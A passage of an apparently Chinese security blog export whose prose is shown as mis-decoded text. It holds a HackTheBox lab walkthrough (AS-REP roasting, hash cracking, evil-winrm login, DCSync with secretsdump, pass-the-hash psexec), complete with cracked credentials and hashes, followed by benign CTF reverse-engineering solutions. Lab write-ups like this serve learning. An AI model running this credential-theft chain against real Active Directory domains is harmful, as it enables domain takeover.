éœ€è¦æ”¹ä¸€ä¸‹neo4jæ‰€ç›‘å¬çš„ip, é»˜è®¤æ˜¯ç›‘å¬æœ¬åœ°ç¯å›, éœ€è¦æ”¹æˆä¸€ä¸ªwindowsä¸Šèƒ½å¤Ÿè®¿é—®åˆ°çš„ip é€šè¿‡åˆ†æFind Principals with DCSync Rights å¯ä»¥çœ‹åˆ°ç”¨æˆ·SVC_BESæœ‰æƒé™GetChanges&amp;GetchangesAll â€œWith both GetChanges and GetChangesAll privileges in BloodHound, you may perform a dcsync attack to get the password hash of an arbitrary principal using mimikatzâ€ https://bloodhound.readthedocs.io/en/latest/data-analysis/edges.html#getchanges-getchangesall mimikatzæœ‰ä¸€ä¸ªdcsyncåŠŸèƒ½, å¯ä»¥åˆ©ç”¨å·å½±æ‹·è´æœåŠ¡ç›´æ¥è¯»å–ntds.dllæ–‡ä»¶å¹¶æ£€ç´¢åŸŸæ•£åˆ—å€¼ã€‚ ã€Šå†…ç½‘å®‰å…¨æ”»é˜²ã€‹ P.296 å¦‚æœèƒ½å¤Ÿæ‹¿åˆ°ç”¨æˆ·svc_besçš„å‡­è¯, å°±èƒ½å¤Ÿä½¿ç”¨dcsyncæ”»å‡» æ‰€ä»¥å°è¯•è·å–ç”¨æˆ·svc_besçš„Hash 1234python GetNPUsers.py megacorp.local/svc_bes -request -no-pass -dc-ip 10.10.10.30[*] Getting TGT for svc_bes$krb5asrep$23$svc_bes@MEGACORP.LOCAL:9b7a931e1152a4631d23173e921373ee$7282d47fdf6ebddcd09f8233636ee97c971b39333ded23097d3fb59c4fb1dfbd772cb3b08b8a8f40a69f69a07f242e0ee2520878b707ab9769208ba2bd6faa76c0a79b39384ef588651127c3164fff013b53d0968d4047dad049b46747b52629c6c9b92427fc7bd6dca13a923bdb833ca9273c2018b605a9eeb0c24005b5ba8988b76952db3a31f6b14f165bd0613e7130ee1bc93cb9a0e4f7a018cbf3913b935778e860d3236d2763b56d871e236e98ea041bbb5b15ebf3138ca16214a758b24194d968320151e58d09a89c2d08e4576ab789076cba4096b4fb328965611663cbe588eafd5bf19af71293701d8a220e çˆ†ç ´Hash 123john --wordlist=/usr/share/wordlists/rockyou.txt hashSheffield19 ($krb5asrep$23$svc_bes@MEGACORP.LOCAL) è¿™é‡Œæœ¬æ¥æ‰“ç®—ç”¨psexecç›´æ¥ç™»å…¥, ä½†æ˜¯å‡ºç°äº†æƒé™ä¸è¶³çš„é”™è¯¯ python psexec.py megacorp.local/svc_bes@10.10.10.30 ä½¿ç”¨WinrmæœåŠ¡ç™»å…¥ 123evil-winrm -i 10.10.10.30 -u svc_bes -p Sheffield19type C:\\users\\svc_bes\\desktop\\user.txtb05fb166688a8603d970c6d033f637f1 dcsyncæ”»å‡» 12secretsdump.py -dc-ip 10.10.10.30 megacorp.local/svc_bes:Sheffield19@10.10.10.30Administrator:500:aad3b435b51404eeaad3b435b51404ee:8a4b77d52b1845bfe949ed1b9643bb18::: ä½¿ç”¨Hashç™»å…¥ 123python psexec.py megacorp.local/administraor@10.10.10.30 -hashes aad3b435b51404eeaad3b435b51404ee:8a4b77d52b1845bfe949ed1b9643bb18type c:\\users\\administrator\\desktop\\root.txtee613b2d048303e5fd4ac6647d944645 å‡ å°é¶æœºä¸‹æ¥è¿˜æ˜¯å­¦åˆ°äº†ä¸å°‘ä¸œè¥¿ è¿˜æ˜¯è‡ªå·±å¤ªèœäº† å‰©ä¸‹çš„StartPointé¶æœºéœ€è¦VIPæ‰èƒ½è®¿é—® ç­‰å“ªå¤©å¿ƒè¡€æ¥æ½®å¼€äº†VIPå†è¯´å§ EOF","categories":[{"name":"Study","slug":"Study","permalink":"https://yoloyolo.top/categories/Study/"}],"tags":[{"name":"Pentest","slug":"Pentest","permalink":"https://yoloyolo.top/tags/Pentest/"},{"name":"HackTheBox","slug":"HackTheBox","permalink":"https://yoloyolo.top/tags/HackTheBox/"},{"name":"Windows","slug":"Windows","permalink":"https://yoloyolo.top/tags/Windows/"}]},{"title":"Reverse_3","slug":"Reverse-3","date":"2021-05-31T21:16:43.000Z","updated":"2021-06-10T14:25:58.000Z","comments":true,"path":"2021/05/31/Reverse-3/","link":"","permalink":"https://yoloyolo.top/2021/05/31/Reverse-3/","excerpt":"éšç¼˜åˆ·é¢˜","text":"éšç¼˜åˆ·é¢˜ [ç½‘é¼æ¯ 2020 é’é¾™ç»„]singal é“¾æ¥: https://buuoj.cn/challenges#[ç½‘é¼æ¯ 2020 é’é¾™ç»„]singal EXE 32 IDAä¸­ _main å‡½æ•°åç¼–è¯‘ç»“æœå¦‚ä¸‹ 12345678910int __cdecl main(int argc, const char **argv, const char **envp)&#123; int v4[117]; // [esp+18h] [ebp-1D4h] BYREF __main(); qmemcpy(v4, dword_403040, 456u); vm_operad(v4, 114); puts(&quot;good,The answer format is:flag &#123;&#125;&quot;); return 0;&#125; è¿™é‡Œdword_403040åªè¿ç®—æœ€ä½ä¸€å­—èŠ‚ 123456789dword_403040 = [0x0A, 0x04, 0x10, 0x08, 0x03, 0x05, 0x01, 0x04, 0x20, 0x08, 0x05, 0x03, 0x01, 0x03, 0x02, 0x08, 0x0B, 0x01, 0x0C, 0x08, 0x04, 0x04, 0x01, 0x05, 0x03, 0x08, 0x03, 0x21, 0x01, 0x0B, 0x08, 0x0B, 0x01, 0x04, 0x09, 0x08, 0x03, 0x20, 0x01, 0x02, 0x51, 0x08, 0x04, 0x24, 0x01, 0x0C, 0x08, 0x0B, 0x01, 0x05, 0x02, 0x08, 0x02, 0x25, 0x01, 0x02, 0x36, 0x08, 0x04, 0x41, 0x01, 0x02, 0x20, 0x08, 0x05, 0x01, 0x01, 0x05, 0x03, 0x08, 0x02, 0x25, 0x01, 0x04, 0x09, 0x08, 0x03, 0x20, 0x01, 0x02, 0x41, 0x08, 0x0C, 0x01, 0x07, 0x22, 0x07, 0x3F, 0x07, 0x34, 0x07, 0x32, 0x07, 0x72, 0x07, 0x33, 0x07, 0x18, 0x07, 0xA7, 0x07, 0x31, 0x07, 0xF1, 0x07, 0x28, 0x07, 0x84, 0x07, 0xC1, 0x07, 0x1E, 0x07, 0x7A] è·Ÿè¿›åˆ° vm_operad å‡½æ•° 12345678910111213141516171819202122232425262728293031323334353637383940414243444546474849505152535455565758596061626364656667686970717273747576777879int __cdecl vm_operad(int *a1, int a2)&#123; int result; // eax char Str[200]; // [esp+13h] [ebp-E5h] BYREF char v4; // [esp+DBh] [ebp-1Dh] int v5; // [esp+DCh] [ebp-1Ch] int v6; // [esp+E0h] [ebp-18h] int v7; // [esp+E4h] [ebp-14h] int v8; // [esp+E8h] [ebp-10h] int v9; // [esp+ECh] [ebp-Ch] v9 = 0; v8 = 0; v7 = 0; v6 = 0; v5 = 0; while ( 1 ) &#123; result = v9; if ( v9 &gt;= a2 ) return result; switch ( a1[v9] ) &#123; case 1: Str[v6 + 100] = v4; ++v9; ++v6; ++v8; break; case 2: v4 = a1[v9 + 1] + Str[v8]; v9 += 2; break; case 3: v4 = Str[v8] - LOBYTE(a1[v9 + 1]); v9 += 2; break; case 4: v4 = a1[v9 + 1] ^ Str[v8]; v9 += 2; break; case 5: v4 = a1[v9 + 1] * Str[v8]; v9 += 2; break; case 6: ++v9; break; case 7: if ( Str[v7 + 100] != a1[v9 + 1] ) &#123; printf(&quot;what a shame...&quot;); exit(0); &#125; ++v7; v9 += 2; break; case 8: Str[v5] = v4; ++v9; ++v5; break; case 10: read(Str); ++v9; break; case 11: v4 = Str[v8] - 1; ++v9; break; case 12: v4 = Str[v8] + 1; ++v9; break; default: continue; &#125; &#125;&#125; æ ¹æ®è¿™é‡Œçš„switchè¯­å¥æ¥åˆ†æ switché‡Œå¯¹äºå„ä¸ªæ•°å€¼çš„æ“ä½œæœ‰äº›ä¸CPUæŒ‡ä»¤ç›¸ä¼¼ åŸæ¥è¿™å°±æ˜¯è™šæ‹Ÿæœºé€†å‘å•Š 0x01å’Œ0x08åˆ†åˆ«å†³å®šè®¡ç®—ç»“æœçš„å­˜å‚¨ä½ç½® 0x02è®¡ç®—åŠ æ³•, 0x03è®¡ç®—å‡æ³•, 0x04è®¡ç®—å¼‚æˆ–, 0x05è®¡ç®—ä¹˜æ³• 0x0Bè‡ªå¢, 0x1Cè‡ªå‡ 0x0Aè¾“å…¥, 0x07ç”¨äºæ ¡éªŒåŠ å¯†åçš„ç»“æœ ç„¶åç…§ç€ä»£ç æŠŠè™šæ‹Ÿæœºå‡½æ•°åç€å†™ä¸€éå³å¯è·å¾—flag 1234567891011121314151617181920212223242526272829303132333435363738394041424344454647484950515253545556575859606162636465666768697071727374#!/usr/bin/env python3a1 = [0x0A, 0x04, 0x10, 0x08, 0x03, 0x05, 0x01, 0x04, 0x20, 0x08, 0x05, 0x03, 0x01, 0x03, 0x02, 0x08, 0x0B, 0x01, 0x0C, 0x08, 0x04, 0x04, 0x01, 0x05, 0x03, 0x08, 0x03, 0x21, 0x01, 0x0B, 0x08, 0x0B, 0x01, 0x04, 0x09, 0x08, 0x03, 0x20, 0x01, 0x02, 0x51, 0x08, 0x04, 0x24, 0x01, 0x0C, 0x08, 0x0B, 0x01, 0x05, 0x02, 0x08, 0x02, 0x25, 0x01, 0x02, 0x36, 0x08, 0x04, 0x41, 0x01, 0x02, 0x20, 0x08, 0x05, 0x01, 0x01, 0x05, 0x03, 0x08, 0x02, 0x25, 0x01, 0x04, 0x09, 0x08, 0x03, 0x20, 0x01, 0x02, 0x41, 0x08, 0x0C, 0x01]a1.reverse()a2 = [0x07, 0x22, 0x07, 0x3F, 0x07, 0x34, 0x07, 0x32, 0x07, 0x72, 0x07, 0x33, 0x07, 0x18, 0x07, 0xA7, 0x07, 0x31, 0x07, 0xF1, 0x07, 0x28, 0x07, 0x84, 0x07, 0xC1, 0x07, 0x1E, 0x07, 0x7A]cipher = []for _ in range(len(a2)): if a2[_] == 0x07: cipher.append(a2[_+1])cipher.reverse()flag = &quot;&quot;v4 = 0v6 = 0v8 = 0v9 = 0while v9 &lt; len(a1)-1: if a1[v9] == 0x01: v4 = cipher[v6] v6 += 1 v8 += 1 v9 += 1 if a1[v9+1] == 0x02: v8 = v4 - a1[v9] v9 += 2 elif a1[v9+1] == 0x03: v8 = v4 + a1[v9] v9 += 2 elif a1[v9+1] == 0x04: v8 = v4 ^ a1[v9] v9 += 2 elif a1[v9+1] == 0x05: v8 = v4 // a1[v9] v9 += 2 elif a1[v9] == 0x06: v9 += 1 elif a1[v9] == 0x0B: v8 = v4 + 1 v9 += 1 elif a1[v9] == 0x0C: v8 = v4 - 1 v9 += 1 elif a1[v9] == 0x08: v4 = v8 v9 += 1 if a1[v9+1] == 0x02: v8 = v4 - a1[v9] v9 += 2 elif a1[v9+1] == 0x03: v8 = v4 + a1[v9] v9 += 2 elif a1[v9+1] == 0x04: v8 = v4 ^ a1[v9] v9 += 2 elif a1[v9+1] == 0x05: v8 = v4 // a1[v9] v9 += 2 elif a1[v9] == 0x06: v9 += 1 elif a1[v9] == 0x0B: v8 = v4 + 1 v9 += 1 elif a1[v9] == 0x0C: v8 = v4 - 1 v9 += 1 flag += chr(v8)print(&quot;flag&#123;&quot; + flag[::-1] + &quot;&#125;&quot;) flag{757515121f3d478} [GXYCTF2019]simple CPP é“¾æ¥: https://buuoj.cn/challenges#[GXYCTF2019]simple CPP EXE 64 IDAä¸­ main å‡½æ•°åç¼–è¯‘ç»“æœå¦‚ä¸‹ 123456789101112131415161718192021222324252627282930313233343536373839404142434445464748495051525354555657585960616263646566676869707172737475767778798081828384858687888990919293949596979899100101102103104105106107108109110111112113114115116117118119120121122123124125126127128129130131132133134135136137138139140141142143144145146147148149150151152153154155156157158159160161162163164165166167168169170171172173174175176177178179180181182183184185186187188189190191192193194195196197198199200int __cdecl main(int argc, const char **argv, const char **envp)&#123; bool v3; // si __int64 v4; // rax __int64 v5; // r8 __int64 v6; // r8 unsigned __int8 *v7; // rax unsigned __int8 *v8; // rbx int v9; // er10 __int64 v10; // r11 void **v11; // r9 void **v12; // r8 __int64 v13; // rdi __int64 v14; // r15 __int64 v15; // r12 __int64 v16; // rbp int v17; // ecx unsigned __int8 *v18; // rdx __int64 v19; // rdi __int64 *v20; // r14 __int64 v21; // rbp __int64 v22; // r13 __int64 *v23; // rdi __int64 v24; // r8 __int64 v25; // r12 __int64 v26; // r15 __int64 v27; // rbp __int64 v28; // rdx __int64 v29; // rbp __int64 v30; // rbp __int64 v31; // r10 __int64 v32; // rdi __int64 v33; // r8 bool v34; // dl __int64 v35; // rax void **v36; // rdx __int64 v37; // rax __int64 v38; // r8 __int64 v39; // rax void *v40; // rcx __int64 v42; // [rsp+20h] [rbp-68h] void *Block[2]; // [rsp+30h] [rbp-58h] BYREF unsigned __int64 v44; // [rsp+40h] [rbp-48h] unsigned __int64 v45; // [rsp+48h] [rbp-40h] v3 = 0; v44 = 0i64; v45 = 15i64; LOBYTE(Block[0]) = 0; v4 = sub_7FF69CF519C0(std::cout, &quot;I&#x27;m a first timer of Logic algebra , how about you?&quot;, envp); std::ostream::operator&lt;&lt;(v4, sub_7FF69CF51B90); sub_7FF69CF519C0(std::cout, &quot;Let&#x27;s start our game,Please input your flag:&quot;, v5); sub_7FF69CF51DE0(std::cin, Block); std::ostream::operator&lt;&lt;(std::cout, sub_7FF69CF51B90); if ( v44 - 5 &gt; 0x19 ) &#123; v39 = sub_7FF69CF519C0(std::cout, &quot;Wrong input ,no GXY&#123;&#125; in input words&quot;, v6); std::ostream::operator&lt;&lt;(v39, sub_7FF69CF51B90); goto LABEL_43; &#125; v7 = (unsigned __int8 *)operator new(0x20ui64); v8 = v7; if ( v7 ) &#123; *(_QWORD *)v7 = 0i64; *((_QWORD *)v7 + 1) = 0i64; *((_QWORD *)v7 + 2) = 0i64; *((_QWORD *)v7 + 3) = 0i64; &#125; else &#123; v8 = 0i64; &#125; v9 = 0; if ( v44 ) &#123; v10 = 0i64; do &#123; v11 = Block; if ( v45 &gt;= 0x10 ) v11 = (void **)Block[0]; v12 = &amp;qword_7FF69CF56048; if ( (unsigned __int64)qword_7FF69CF56060 &gt;= 0x10 ) v12 = (void **)qword_7FF69CF56048; v8[v10] = *((byte_0 *)v11 + v10) ^ *((byte_0 *)v12 + v9 % 27); ++v9; ++v10; &#125; while ( v9 &lt; v44 ); &#125; v13 = 0i64; v14 = 0i64; v15 = 0i64; v16 = 0i64; if ( (int)v44 &gt; 30 ) goto LABEL_27; v17 = 0; if ( (int)v44 &lt;= 0 ) goto LABEL_27; v18 = v8; do &#123; v19 = *v18 + v13; ++v17; ++v18; switch ( v17 ) &#123; case 8: v16 = v19; goto LABEL_23; case 16: v15 = v19; goto LABEL_23; case 24: v14 = v19;LABEL_23: v19 = 0i64; break; case 32: sub_7FF69CF519C0(std::cout, &quot;ERRO,out of range&quot;, (unsigned int)v44); exit(1); &#125; v13 = v19 &lt;&lt; 8; &#125; while ( v17 &lt; (int)v44 ); if ( v16 ) &#123; v20 = (__int64 *)operator new(0x20ui64); *v20 = v16; v20[1] = v15; v20[2] = v14; v20[3] = v13; goto LABEL_28; &#125;LABEL_27: v20 = 0i64;LABEL_28: v42 = v20[2]; v21 = v20[1]; v22 = *v20; v23 = (__int64 *)operator new(0x20ui64); if ( IsDebuggerPresent() ) &#123; sub_7FF69CF519C0(std::cout, &quot;Hi , DO not debug me !&quot;, v24); Sleep(0x7D0u); exit(0); &#125; v25 = v21 &amp; v22; *v23 = v21 &amp; v22; v26 = v42 &amp; ~v22; v23[1] = v26; v27 = ~v21; v28 = v42 &amp; v27; v23[2] = v42 &amp; v27; v29 = v22 &amp; v27; v23[3] = v29; if ( v26 != 0x11204161012i64 ) &#123; v23[1] = 0i64; v26 = 0i64; &#125; v30 = v26 | v25 | v28 | v29; v31 = v20[1]; v32 = v20[2]; v33 = v28 &amp; *v20 | v32 &amp; (v25 | v31 &amp; ~*v20 | ~(v31 | *v20)); v34 = 0; if ( v33 == 0x8020717153E3013i64 ) v34 = v30 == 0x3E3A4717373E7F1Fi64; if ( (v30 ^ v20[3]) == 0x3E3A4717050F791Fi64 ) v3 = v34; if ( (v26 | v25 | v31 &amp; v32) == (~*v20 &amp; v32 | 0xC00020130082C0Ci64) &amp;&amp; v3 ) &#123; v35 = sub_7FF69CF519C0(std::cout, &quot;Congratulations!flag is GXY&#123;&quot;, v33); v36 = Block; if ( v45 &gt;= 0x10 ) v36 = (void **)Block[0]; v37 = sub_7FF69CF51FD0(v35, v36, v44); sub_7FF69CF519C0(v37, &quot;&#125;&quot;, v38); j_j_free(v8); &#125; else &#123; sub_7FF69CF519C0(std::cout, &quot;Wrong answer!try again&quot;, v33); j_j_free(v8); &#125;LABEL_43: if ( v45 &gt;= 0x10 ) &#123; v40 = Block[0]; if ( v45 + 1 &gt;= 0x1000 ) &#123; v40 = (void *)*((_QWORD *)Block[0] - 1); if ( (unsigned __int64)(Block[0] - v40 - 8) &gt; 0x1F ) invalid_parameter_noinfo_noreturn(); &#125; j_j_free(v40); &#125; return 0;&#125; ä¸»å‡½æ•°ä¸€å †çš„è¿ç®—è¿‡ç¨‹çœ‹èµ·æ¥æœ‰ç‚¹æ— ä»ä¸‹æ‰‹ ä»”ç»†åˆ†æä¸€éä¹‹åå¯ä»¥å¾—å‡ºä¸‹é¢çš„æµç¨‹ 12345678910111213141516171819202122v12 &#x3D; &quot;i_will_check_is_debug_or_not&quot;v8 &#x3D; plain ^ v12v16 &#x3D; v8[:8]v15 &#x3D; v8[8:16]v14 &#x3D; v8[16:24]v13 &#x3D; v8[24:]v25 &#x3D; v15 &amp; v16v26 &#x3D; v14 &amp; ~v16v27 &#x3D; ~v15v28 &#x3D; v14 &amp; ~v15v29 &#x3D; v16 &amp; ~v15v23[0] &#x3D; v15 &amp; v16v23[1] &#x3D; v14 &amp; ~v16v23[2] &#x3D; v14 &amp; ~v15v23[3] &#x3D; v16 &amp; ~v15v14 &amp; ~v16 &#x3D;&#x3D; 0x11204161012v30 &#x3D; v25 | v26 | v28 | v29 &#x3D;&#x3D; 0x3E3A4717373E7F1Fv31 &#x3D; v15v32 &#x3D; v14v33 &#x3D; v28 &amp; v16 | v32 &amp; (v25 | v31 &amp; ~v16 | ~(v31 | v16)) &#x3D;&#x3D; 0x8020717153E3013v30 ^ v13 &#x3D;&#x3D; 0x3E3A4717050F791F(v26 | v25 | v31 &amp; v32) &#x3D;&#x3D; (~v16 &amp; v32 | 0xC00020130082C0C) å…¶ä¸­v12éœ€è¦ä½¿ç”¨åŠ¨è°ƒæ¥è·å¾—å†…å®¹ 1v8[v10] = *((byte_0 *)v11 + v10) ^ *((byte_0 *)v12 + v9 % 27); åŒæ—¶æˆ‘ä»¬å¯ä»¥æ ¹æ®è¿™æ¡ä»£ç æ¥æ¨æµ‹flagå†…å®¹çš„é•¿åº¦åº”è¯¥ä¸º27 Z3è§£æ–¹ç¨‹ç»„ 12345678910111213141516171819202122232425262728293031#!/usr/bin/env python3from z3 import *from Crypto.Util.number import *v13, v14, v15, v16 = BitVecs(&quot;v13 v14 v15 v16&quot;, 64)s = Solver()s.add(v14 &amp; ~v16 == 0x11204161012)s.add((v15 &amp; v16)|(v14 &amp; ~v16)|(v14 &amp; ~v15)|(v16 &amp; ~v15) == 0x3E3A4717373E7F1F)s.add(((v14 &amp; ~v15) &amp; v16)| (v14 &amp; (v15 &amp; v16 | v15 &amp; ~v16 | ~(v15 | v16))) == 0x8020717153E3013)s.add(0x3E3A4717373E7F1F ^ v13 == 0x3E3A4717050F791F)s.add(((v14 &amp; ~v16) | (v15 &amp; v16) | (v15 &amp; v14)) == (~v16 &amp; v14 | 0xC00020130082C0C))s.check()m = s.model()&quot;&quot;&quot;print(m)[v13 = 842073600, v16 = 4483973367147818765, v14 = 577031497978884115, v15 = 864693882343402508]&quot;&quot;&quot;cipher = b&quot;&quot;v12 = &quot;i_will_check_is_debug_or_no&quot;flag = &quot;flag&#123;&quot;m = [4483973367147818765, 864693882343402508, 577031497978884115, 842073600]for _ in m: cipher += long_tobyte_0s(_)print(cipher)for _ in range(len(cipher)): flag += chr(cipher[_] ^ ord(v12[_]))flag += &quot;&#125;&quot;print(flag) è²Œä¼¼æ˜¯å› ä¸ºå¤šè§£çš„åŸå›  å¯¼è‡´æœ€åå¾—åˆ°çš„flagä¸æ­£ç¡® æ‰€ä»¥æ¯”èµ›æ—¶ç»™å‡ºäº†flagçš„ç¬¬äºŒéƒ¨åˆ†&quot;e!P0or_a&quot; flag{We1l_D0ne!P0or_algebra_am_i} [WUSTCTF2020]level4 é“¾æ¥: https://buuoj.cn/challenges#[WUSTCTF2020]level4 ELF 64 IDAä¸­ main å‡½æ•°åç¼–è¯‘ç»“æœå¦‚ä¸‹ 123456789101112131415int __cdecl main(int argc, const char **argv, const char **envp)&#123; puts(&quot;Practice my Data Structure code.....&quot;); puts(&quot;Typing....Struct.....char....*left....*right............emmmmm...OK!&quot;); init(&quot;Typing....Struct.....char....*left....*right............emmmmm...OK!&quot;, argv); puts(&quot;Traversal!&quot;); printf(&quot;Traversal type 1:&quot;); type1(&amp;unk_601290); printf(&quot;\\nTraversal type 2:&quot;); type2(&amp;unk_601290); printf(&quot;\\nTraversal type 3:&quot;); puts(&quot; //type3(&amp;x[22]); No way!&quot;); puts(&amp;byte_400A37); return 0;&#125; äºŒå‰æ ‘ä¸­åºéå† 123456789101112__int64 __fastcall type1(char *a1)&#123; __int64 result; // rax if ( a1 ) &#123; type1(*((_QWORD *)a1 + 1)); putchar(*a1); result = type1(*((_QWORD *)a1 + 2)); &#125; return result;&#125; äºŒå‰æ ‘ååºéå† 123456789101112int __fastcall type2(char *a1)&#123; int result; // eax if ( a1 ) &#123; type2(*((_QWORD *)a1 + 1)); type2(*((_QWORD *)a1 + 2)); result = putchar(*a1); &#125; return result;&#125; ç»“åˆè¾“å‡ºç»“æœæ¥çœ‹ å…ˆåºéå†çš„è¾“å‡ºç»“æœåº”è¯¥å°±æ˜¯flag è¿™é‡Œä¸ä¼šå†™è½¬æ¢è„šæœ¬ ç›´æ¥åœ¨IDAé‡Œé¢åŠ¨è°ƒçœ‹unk_601290çš„æ•°æ®ç»“æ„äº† æ•°æ®+8Byte æ˜¯å·¦å­èŠ‚ç‚¹çš„åœ°å€ æ•°æ®+16Byte æ˜¯å³å­èŠ‚ç‚¹çš„åœ°å€ flag{This_IS_A_7reE} [GUET-CTF2019]number_game é“¾æ¥: https://buuoj.cn/challenges#[GUET-CTF2019]number_game ELF 64 IDAä¸­ main å‡½æ•°åç¼–è¯‘ç»“æœå¦‚ä¸‹ 12345678910111213141516171819202122232425262728293031323334353637unsigned __int64 __fastcall main(int a1, char **a2, char **a3)&#123; _QWORD *v4; // [rsp+8h] [rbp-38h] __int64 v5; // [rsp+10h] [rbp-30h] BYREF __int16 v6; // [rsp+18h] [rbp-28h] __int64 v7; // [rsp+20h] [rbp-20h] BYREF __int16 v8; // [rsp+28h] [rbp-18h] char v9; // [rsp+2Ah] [rbp-16h] unsigned __int64 v10; // [rsp+38h] [rbp-8h] v10 = __readfsqword(0x28u); v5 = 0LL; v6 = 0; v7 = 0LL; v8 = 0; v9 = 0; __isoc99_scanf(&quot;%s&quot;, &amp;v5); if ( (unsigned int)sub_4006D6((const char *)&amp;v5) ) &#123; v4 = sub_400758((__int64)&amp;v5, 0, 0xAu); sub_400807((__int64)v4, (__int64)&amp;v7); v9 = 0; sub_400881((char *)&amp;v7); if ( (unsigned int)sub_400917() ) &#123; puts(&quot;TQL!&quot;); printf(&quot;flag&#123;&quot;); printf(&quot;%s&quot;, (const char *)&amp;v5); puts(&quot;&#125;&quot;); &#125; else &#123; puts(&quot;your are cxk!!&quot;); &#125; &#125; return __readfsqword(0x28u) ^ v10;&#125; 12345678910111213141516171819202122__int64 __fastcall sub_4006D6(const char *a1)&#123; __int64 result; // rax int i; // [rsp+1Ch] [rbp-4h] if ( strlen(a1) == 10 ) &#123; for ( i = 0; i &lt;= 9; ++i ) &#123; if ( a1[i] &gt; 52 || a1[i] &lt;= 47 ) goto LABEL_2; &#125; result = 1LL; &#125; else &#123;LABEL_2: puts(&quot;Wrong!&quot;); result = 0LL; &#125; return result;&#125; å‡½æ•°sub_4006D6è¦æ±‚è¾“å…¥çš„å­—ç¬¦ä¸²é•¿åº¦ä¸º10ä¸”å­—ç¬¦é›†ä¸º&quot;01234&quot; é€šè¿‡æ§åˆ¶è¾“å…¥, åŠ¨æ€è°ƒè¯•sub_400807å¾—åˆ°é‡æ–°æ’åºä¹‹åçš„å­—ç¬¦ä¸² å› ä¸ºå®åœ¨æ‡’å¾—çœ‹ä»£ç äº†, æ›²çº¿æ•‘å›½ 123450123401234233144002100112233443140420213 æ ¹æ®ä¸¤ç»„è¾“å…¥è¾“å‡ºåˆ™å¯ä»¥å¾—å‡ºè§£å¯†åºåˆ—ä¸º 1seq = [6, 3, 8, 1, 5, 7, 9, 0, 2, 4] 1234567891011121314151617__int64 __fastcall sub_400881(char *a1)&#123; __int64 result; // rax byte_601062 = *a1; byte_601067 = a1[1]; byte_601069 = a1[2]; byte_60106B = a1[3]; byte_60106E = a1[4]; byte_60106F = a1[5]; byte_601071 = a1[6]; byte_601072 = a1[7]; byte_601076 = a1[8]; result = (unsigned __int8)a1[9]; byte_601077 = a1[9]; return result;&#125; 12345678910111213141516171819202122232425.data:0000000000601060 unk_601060 db 31h ; 1.data:0000000000601061 db 34h ; 4.data:0000000000601062 byte_601062 db 23h ; DATA XREF: sub_400881+Fâ†‘w.data:0000000000601063 db 32h ; 2.data:0000000000601064 db 33h ; 3.data:0000000000601065 db 33h ; 3.data:0000000000601066 db 30h ; 0.data:0000000000601067 byte_601067 db 23h ; DATA XREF: sub_400881+1Dâ†‘w.data:0000000000601068 db 31h ; 1.data:0000000000601069 byte_601069 db 23h ; DATA XREF: sub_400881+2Bâ†‘w.data:000000000060106A db 30h ; 0.data:000000000060106B byte_60106B db 23h ; DATA XREF: sub_400881+39â†‘w.data:000000000060106C db 32h ; 2.data:000000000060106D db 33h ; 3.data:000000000060106E byte_60106E db 23h ; DATA XREF: sub_400881+47â†‘w.data:000000000060106F byte_60106F db 23h ; DATA XREF: sub_400881+55â†‘w.data:0000000000601070 db 33h ; 3.data:0000000000601071 byte_601071 db 23h ; DATA XREF: sub_400881+63â†‘w.data:0000000000601072 byte_601072 db 23h ; DATA XREF: sub_400881+71â†‘w.data:0000000000601073 db 30h ; 0.data:0000000000601074 db 34h ; 4.data:0000000000601075 db 32h ; 2.data:0000000000601076 byte_601076 db 23h ; DATA XREF: sub_400881+7Fâ†‘w.data:0000000000601077 byte_601077 db 23h ; DATA XREF: sub_400881+8Dâ†‘w.data:0000000000601078 db 31h ; 1 å¯ä»¥çœ‹åˆ°é€šè¿‡v7èµ‹å€¼çš„åœ°å€éƒ½æ˜¯æ°å¥½æ˜¯ç©ºå€¼çš„ä½ç½®, åˆ™è¿™é‡Œæ˜¯åœ¨å¡«ç©º 1234567891011121314151617181920212223__int64 sub_400917()&#123; unsigned int v1; // [rsp+0h] [rbp-10h] int i; // [rsp+4h] [rbp-Ch] int j; // [rsp+8h] [rbp-8h] int k; // [rsp+Ch] [rbp-4h] v1 = 1; for ( i = 0; i &lt;= 4; ++i ) &#123; for ( j = 0; j &lt;= 4; ++j ) &#123; for ( k = j + 1; k &lt;= 4; ++k ) &#123; if ( *((byte_0 *)&amp;unk_601060 + 5 * i + j) == *((byte_0 *)&amp;unk_601060 + 5 * i + k) ) v1 = 0; if ( *((byte_0 *)&amp;unk_601060 + 5 * j + i) == *((byte_0 *)&amp;unk_601060 + 5 * k + i) ) v1 = 0; &#125; &#125; &#125; return v1;&#125; çœ‹åˆ°è¿™é‡Œå°±å·®ä¸å¤šæ˜ç™½äº† æ¨ªçºµä¸èƒ½å‡ºç°ç›¸åŒçš„æ•°å­—, é‚£ä¹ˆè¿™ä¸ªç¨‹åºå°±æ˜¯ä¸ªæ•°ç‹¬æ¸¸æˆäº† ä¸”æ•°ç‹¬çš„å¸ƒå±€å¦‚ä¸‹ 123456sudoku = [1, 4, X, 2, 3,3, 0, X, 1, X,0, X, 2, 3, X,X, 3, X, X, 0,4, 2, X, X, 1] è§£å‡ºåå¾—å‡ºåºåˆ—ä¸º 1cipher = [0, 4, 2, 1, 4, 2, 1, 4, 3, 0] 1234567#!/usr/bin/env python3cipher = [0, 4, 2, 1, 4, 2, 1, 4, 3, 0]seq = [6, 3, 8, 1, 5, 7, 9, 0, 2, 4]flag = [0 for _ in range(10)]for _ in range(len(cipher)): flag[_] = str(cipher[seq[_]])print(&quot;flag&#123;&quot;+&quot;&quot;.join(flag)+&quot;&#125;&quot;) flag{1134240024} [GWCTF 2019]re3 é“¾æ¥: https://buuoj.cn/challenges#[GWCTF 2019]re3 ELF 64 IDAä¸­ main å‡½æ•°åç¼–è¯‘ç»“æœå¦‚ä¸‹ 12345678910111213141516171819void __fastcall __noreturn main(int a1, char **a2, char **a3)&#123; int i; // [rsp+8h] [rbp-48h] char s[40]; // [rsp+20h] [rbp-30h] BYREF unsigned __int64 v5; // [rsp+48h] [rbp-8h] v5 = __readfsqword(0x28u); __isoc99_scanf(&quot;%39s&quot;, s); if ( (unsigned int)strlen(s) != 32 ) &#123; puts(&quot;Wrong!&quot;); exit(0); &#125; mprotect(&amp;dword_400000, 0xF000uLL, 7); for ( i = 0; i &lt;= 223; ++i ) *((byte_0 *)sub_402219 + i) ^= 0x99u; sub_40207B(&amp;unk_603170); sub_402219(s);&#125; 12for ( i = 0; i &lt;= 223; ++i ) *((byte_0 *)sub_402219 + i) ^= 0x99u; æ³¨æ„çœ‹ç€ä¸€æ®µä»£ç  